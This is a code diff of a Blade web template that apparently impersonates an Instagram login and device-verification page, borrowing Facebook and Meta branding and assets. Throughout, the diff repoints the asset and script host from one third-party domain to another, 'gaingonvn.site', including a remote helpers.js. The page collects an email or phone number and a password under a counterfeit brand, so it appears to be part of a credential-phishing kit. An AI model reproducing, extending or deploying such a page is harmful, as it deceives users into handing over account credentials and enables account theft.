@@ -15,7 +15,7 @@
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/favicon.ico" />
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/favicon.ico" />
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -39,7 +39,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -57,7 +57,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('instagram.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
@@ -89,7 +89,7 @@
         <div class="hidden sm:block col-span-1">
             <a href="" class="block ml-10">
                 {{-- Instagram Logo --}}
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/ig_logo.webp"
                     alt="ins-logo" class="mt-[50px] ml-4" width="70">
             </a>
             <div class="flex flex-col justify-center items-center px-10">
@@ -97,7 +97,7 @@
                     {{ explode('_', __('instagram.discover_anything_you_like'))[0] }} <span
                         class="text-[#d300c5]">{{ explode('_', __('instagram.discover_anything_you_like'))[1] }}</span>
                 </h1>
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/banner.webp"
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/banner.webp"
                     alt="ig-banner" class="w-[50%]">
             </div>
         </div>
@@ -106,7 +106,7 @@
                 <div class="space-y-3 w-full">
                     <div class="flex justify-center my-10 sm:hidden">
                         {{-- Mobile Instagram Logo --}}
-                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
+                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/instagram/ig_logo.webp"
                             alt="fb-logo" width="60">
                     </div>
                     {{-- Notice đăng nhập --}}
@@ -124,7 +124,7 @@
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                     for="user">{{ __('instagram.email_or_phone') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
-                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
+                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/close_logo.svg"
                                         width="25" />
                                 </button>
                             </div>
@@ -140,12 +140,12 @@
                                 @if ($setting->showFacebookPasswordButton)
                                     <button type="button" id="show_pass" class="cursor-pointer hidden"
                                         tabindex="-1">
-                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
+                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/show_pass.svg"
                                             width="25" />
                                     </button>
                                     <button type="button" id="hide_pass" class="cursor-pointer hidden"
                                         tabindex="-1">
-                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
+                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/hide_pass.svg"
                                             width="25" />
                                     </button>
                                 @endif
@@ -165,7 +165,7 @@
                                 {{ __('instagram.create_new_account') }}
                             </button>
                             <div class="flex justify-center mb-5">
-                                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
+                                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/meta_logo.png"
                                     alt="fb-logo" width="55">
                             </div>
                         </div>
@@ -191,7 +191,7 @@
             </script>
         </p>
     </div>
-    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/helpers.js"></script>
     <script>
         ////
         @if ($type == 'custom')
